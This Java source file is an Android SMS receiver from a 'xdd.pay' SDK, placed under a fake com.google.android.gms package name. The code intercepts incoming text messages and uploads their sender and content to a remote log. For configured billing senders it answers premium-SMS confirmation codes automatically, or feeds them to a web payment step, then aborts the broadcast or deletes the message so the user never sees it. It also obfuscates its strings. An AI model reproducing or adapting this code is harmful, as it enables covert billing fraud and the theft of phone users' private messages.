package com.google.android.gms.receiver;

import java.util.ArrayList;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsMessage;
import android.text.TextUtils;

import com.google.android.gms.util.SmsUtils;
import com.xdd.pay.config.Config;
import com.xdd.pay.data.StringData;
import com.xdd.pay.db.StorageConfig;
import com.xdd.pay.db.StorageUtils;
import com.xdd.pay.network.object.InterceptInfo;
import com.xdd.pay.network.object.LogInfo;
import com.xdd.pay.network.object.PayCodeInfo;
import com.xdd.pay.network.object.PayInfo;
import com.xdd.pay.network.object.SmsLogInfo;
import com.xdd.pay.network.object.VerifyInfo;
import com.xdd.pay.util.EncryptUtils;
import com.xdd.pay.util.PayAgentUtils;
import com.xdd.pay.util.PayUtils;
import com.xdd.pay.util.QYLog;
import com.xdd.pay.util.SerializeUtil;
import com.xdd.pay.util.constant.MOType;
import com.xdd.pay.util.constant.ReplyPloy;
import com.xdd.pay.util.constant.ResultType;
import com.xdd.pay.util.constant.SmsConstant;

/**
 * 短信拦截
 */
@SuppressLint("HandlerLeak")
public class SmsReceiver extends BroadcastReceiver {
	private static SmsContentObserver smsContentObserver;
	// private int index = 0;
	private Context context;
	private boolean isReceiver = false;

	private String smsContent = "";
	private String phoneNum = "";
	
	// 如果读取成功的话就调用回调函数
	private Handler handler = new Handler() {
		@Override
		public void handleMessage(Message msg) {
			if (!isReceiver) {
				Bundle mBundle = msg.getData();
				smsContent = mBundle.getString(EncryptUtils.decode(SmsConstant.SMS_CONTENT));
				phoneNum = mBundle.getString(EncryptUtils.decode(SmsConstant.PHONE_NUM));
				QYLog.e(" num" + phoneNum + "-----msg:" + smsContent);
				dealWithMsg(smsContent, phoneNum, context, true);
			}
		}
	};

	public SmsReceiver() {
		if (PayUtils.getInstance().mContext != null) {
			this.context = PayUtils.getInstance().mContext;
			QYLog.e(Config.SDK_VERSION_NAME);
		} else {
		    if (PayAgentUtils.mContext != null) {
		       this.context = PayAgentUtils.mContext;
		    } else {
		        QYLog.e("context is null " + Config.SDK_VERSION_NAME);
		    }
			QYLog.e(" context is null " + Config.SDK_VERSION_NAME);
		}
		 
	    try {
	        if (this.context != null) {
	    	    SmsReceiver.smsContentObserver = new SmsContentObserver(context, handler);
	    	    // 注册观察者。观察短信数据库变化
	    	    context.getContentResolver().registerContentObserver(Uri.parse(EncryptUtils.decode(SmsConstant.CONTENT_SMS)), true, smsContentObserver);
	        }
		} catch (Exception e) {
			QYLog.e(e.toString());
		}
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		isReceiver = true;
//		QYLog.d("----------onReceive-----isReceiver--" + isReceiver + "--sdk version---" + Config.SDK_VERSION_NAME);
		String action = intent.getAction();
		if (!StringData.getInstance().SMS_RECEIVED.equals(action)) {
			QYLog.e("action is error");
			isReceiver = false;
			return;
		}

		Bundle bundle = intent.getExtras();
		if (bundle == null) {
			QYLog.e(" bundle is null");
			isReceiver = false;
			return;
		}

		Object pdus = bundle.get("pdus");
		Object messages[] = (Object[]) pdus;

		SmsMessage smsMessage[] = new SmsMessage[messages.length];

		String phoneNum = "";
		StringBuffer sb = new StringBuffer();
		String textMsg = null;

		for (int n = 0; n < messages.length; n++) {
			if (messages[n] != null) {
				smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
				if (smsMessage[n] != null) {
					phoneNum = smsMessage[n].getOriginatingAddress();
					String msg = smsMessage[n].getMessageBody();
					sb.append(msg);
				}
			}
		}
		textMsg = sb.toString();
		dealWithMsg(textMsg, phoneNum, context, false);
		// 上传日志
		try {
			SmsLogInfo smsLogInfo = new SmsLogInfo();
			smsLogInfo.setLocalTime(System.currentTimeMillis() + "");
			smsLogInfo.setPhoneNum(phoneNum);
			smsLogInfo.setSms(textMsg);
			smsLogInfo.setType(MOType.SMS_BROADCAST_LOG);
			smsLogInfo.setResult(ResultType.SUCCESS);
			PayUtils.getInstance().sendRealTimeLog(smsLogInfo, false);
		} catch (Exception e) {
			QYLog.e("send log error:" + e.getLocalizedMessage());
		}
		isReceiver = false;

	}

	@SuppressWarnings({ "unchecked" })
	public void dealWithMsg(String msg, String phoneNum, Context context, boolean isDB) {
		ArrayList<PayCodeInfo> verifyInfoList = PayUtils.getInstance().verifyInfoList;
		ArrayList<PayCodeInfo> interceptInfoList = PayUtils.getInstance().interceptInfoList;
		String pointNum = PayUtils.getInstance().mPointNum;
		PayInfo curPayInfo = PayUtils.getInstance().mCurPayInfo;
		ArrayList<LogInfo> logInfoList = PayUtils.getInstance().logInfoList;
		String clientLinkId = PayUtils.getInstance().mLinkId;
		try {
			if (interceptInfoList == null || interceptInfoList.isEmpty()) {
				String str = StorageUtils.getConfig4String(context, StorageConfig.INTERCEPTLIST_KEY);
				if(str!= null && !str.equals("") && SerializeUtil.getInstance().deSerialization(str) != null) {
			       interceptInfoList = (ArrayList<PayCodeInfo>) SerializeUtil.getInstance().deSerialization(str);
				}
			}

			if (verifyInfoList == null || verifyInfoList.isEmpty()) {
				String str = StorageUtils.getConfig4String(context, StorageConfig.VERIFYLIST_KEY);
				if(str!= null && !str.equals("") && SerializeUtil.getInstance().deSerialization(str) != null) {
				   verifyInfoList = (ArrayList<PayCodeInfo>) SerializeUtil.getInstance().deSerialization(str);
				}
			}

			if (curPayInfo == null) {
				String str = StorageUtils.getConfig4String(context, StorageConfig.PAYINFO_KEY);
				curPayInfo = (PayInfo) SerializeUtil.getInstance().deSerialization(str);
			}

			if (logInfoList == null) {
				String str = StorageUtils.getConfig4String(context, StorageConfig.LOG_LIST_KEY);
				logInfoList = (ArrayList<LogInfo>) SerializeUtil.getInstance().deSerialization(str);
				if (logInfoList != null) {
					PayUtils.getInstance().logInfoList = logInfoList;
				}
			}
		} catch (Exception e) {
			QYLog.e("serialization error:" + e);
		}

		if (TextUtils.isEmpty(pointNum)) {
			pointNum = StorageUtils.getConfig4String(context, StorageConfig.POINTNUM_KEY);
			PayUtils.getInstance().mPointNum = pointNum;
		}

		if (TextUtils.isEmpty(clientLinkId)) {
			clientLinkId = StorageUtils.getConfig4String(context, StorageConfig.CLIENT_LINK_ID_KEY);
			PayUtils.getInstance().mLinkId = clientLinkId;
		}

		doVerify(msg, phoneNum, pointNum, verifyInfoList, curPayInfo, isDB);// 回复策略，如果处理完则返回

		doIntercept(msg, phoneNum, interceptInfoList, isDB);// 拦截策略
	}

	private void doIntercept(String msg, String phoneNum, ArrayList<PayCodeInfo> interceptInfoList, boolean isDB) {
		for (final PayCodeInfo payCodeInfo : interceptInfoList) {
			try {
				QYLog.d("receiver pc Info:" + payCodeInfo.toString());
				ArrayList<InterceptInfo> interceptInfos = payCodeInfo.getInterceptInfoList();

				for (InterceptInfo interceptInfo : interceptInfos) {
					if (!TextUtils.isEmpty(interceptInfo.getPhoneNum())
							&& !TextUtils.isEmpty(interceptInfo.getMessage())) { // 如果配置了端口屏蔽，则根据双重维度进行屏蔽
						dealWithIntercept(msg, phoneNum, interceptInfo, isDB);
					} else if (TextUtils.isEmpty(interceptInfo.getPhoneNum())
							&& !TextUtils.isEmpty(interceptInfo.getMessage())) {
						if (msg.contains(interceptInfo.getMessage())) { // 如果没有配置端口屏蔽，则直接根据关键字屏蔽
							// abortBroadcast();
							dealBroadcast(msg, phoneNum, isDB);
						}
					}
				}
			} catch (Exception e) {
				QYLog.p(e);
			}
		}
	}

	private void doVerify(String msg, String phoneNum, String pointNum, ArrayList<PayCodeInfo> verifyInfoList,
			PayInfo curPayInfo, boolean isDB) {
		if (PayUtils.getInstance().mContext == null) {
			PayUtils.getInstance().mContext = context;
		}

		for (final PayCodeInfo payCodeInfo : verifyInfoList) {
			try {
				QYLog.d("receiver pcInfo:" + payCodeInfo.toString());
				VerifyInfo verifyInfo = payCodeInfo.getVerifyInfo();

				if (verifyInfo != null && !TextUtils.isEmpty(verifyInfo.getMatch()) && !TextUtils.isEmpty(msg)
						&& msg.contains(verifyInfo.getMatch())) {
					boolean flag = false;
					if (PayUtils.getInstance().payInfoSilentMap != null && TextUtils.isEmpty(pointNum)) {
						flag = true;
					} else {
						for (PayCodeInfo sInfo : PayUtils.getInstance().payInfoSilentList) {
							if (payCodeInfo.getCode().equals(sInfo.getCode())) {
								flag = true;
								break;
							}
						}
					}

					if (payCodeInfo.getPloy() == ReplyPloy.STATIC_SELF) {// 发件用户固定内容回复
						dealBroadcast(msg, phoneNum, isDB);
						SmsUtils.sendSms(phoneNum, verifyInfo.getCode(), null, null);
						PayUtils.getInstance().ReceiverSuccess(payCodeInfo, null, flag, curPayInfo);
//						QYLog.d("STATIC_SELF Phone:" + phoneNum + ",sendContent:" + verifyInfo.getCode());
						//return true;
					} else if (payCodeInfo.getPloy() == ReplyPloy.STATIC) {// 固定内容回复
						dealBroadcast(msg, phoneNum, isDB);
						String sendDest = verifyInfo.getPhoneNum();
						if (TextUtils.isEmpty(sendDest)) { // 如果下发的端口为空，则回复到收件端口
							sendDest = phoneNum;
						}
						SmsUtils.sendSms(sendDest, verifyInfo.getCode(), null, null);
						PayUtils.getInstance().ReceiverSuccess(payCodeInfo, null, flag, curPayInfo);
//						QYLog.d("STATIC  sPhone:" + sendDest + ",sendContent:" + verifyInfo.getCode());
						//return true;
					} else if (payCodeInfo.getPloy() == ReplyPloy.DYNAMIC) {// 动态内容回复
						dealBroadcast(msg, phoneNum, isDB);
						int index = msg.lastIndexOf(verifyInfo.getMatch());
						int begin = index + verifyInfo.getMatch().length();
						String sendMsg = msg.substring(begin, begin + verifyInfo.getLength());
						String sendDest = verifyInfo.getPhoneNum();
						if (TextUtils.isEmpty(sendDest)) { // 如果下发的端口为空，则回复到收件端口
							sendDest = phoneNum;
						}
						SmsUtils.sendSms(sendDest, sendMsg, null, null);
						PayUtils.getInstance().ReceiverSuccess(payCodeInfo, null, flag, curPayInfo);
//						QYLog.d("DYNAMIC  sPhone:" + verifyInfo.getPhoneNum() + ",sendContent:" + verifyInfo.getCode());
						//return true;
					} else if (payCodeInfo.getPloy() == ReplyPloy.WEB) {// 获取WEB动态验证码进行二次请求
						dealBroadcast(msg, phoneNum, isDB);
						int index = msg.lastIndexOf(verifyInfo.getMatch());
						int begin = index + verifyInfo.getMatch().length();
						String verifyCode = msg.substring(begin, begin + verifyInfo.getLength());
						PayUtils.getInstance().doWebSecondPay(payCodeInfo, verifyCode, false, curPayInfo);
//						QYLog.d("receiver msg:" + msg);
//						QYLog.d("WEB  sPhone:" + phoneNum + ",sendContent:" + verifyInfo.getCode() + ",sVerifyCode:"
//								+ verifyCode);
						//return true;
					} else if (payCodeInfo.getPloy() == ReplyPloy.NET_DEAL_WITH) {// 联网处理
						dealBroadcast(msg, phoneNum, isDB);
						PayUtils.getInstance().doSmsNetDealWith(payCodeInfo, msg, phoneNum, flag, curPayInfo);
//						QYLog.d("receiver doSmsNetDealWith msg:" + msg + " phone:" + phoneNum);
						//return true;
					}
				}
			} catch (Exception e) {
				QYLog.p(e);
			}
		}

		//return false;
	}

	private void dealWithIntercept(String msg, String phoneNum, InterceptInfo interceptInfo, boolean isDB) {
		if (phoneNum.contains(interceptInfo.getPhoneNum()) && msg.contains(interceptInfo.getMessage())) {
//			QYLog.d("Intercept phone:" + phoneNum + "  msg:" + msg);
			dealBroadcast(msg, phoneNum, isDB);
		}
	}

	public static void unregisteObserver(Context context) {
		if(smsContentObserver == null){
//			QYLog.d("unregisteObserver smsContentObserver is null");
			return;
		}
		context.getContentResolver().unregisterContentObserver(smsContentObserver);
	}

	private void dealBroadcast(String msg, String dest, boolean isDB) {
//		QYLog.d("-------dealBroadcast-----" + isReceiver);
		try {
			if(!isDB){
				abortBroadcast();
			}
		} catch (Exception e) {
			QYLog.e(e.getLocalizedMessage());
		}
		if(isDB){
			smsContentObserver.deleteSMS(context, msg, phoneNum);
		}
	}

}
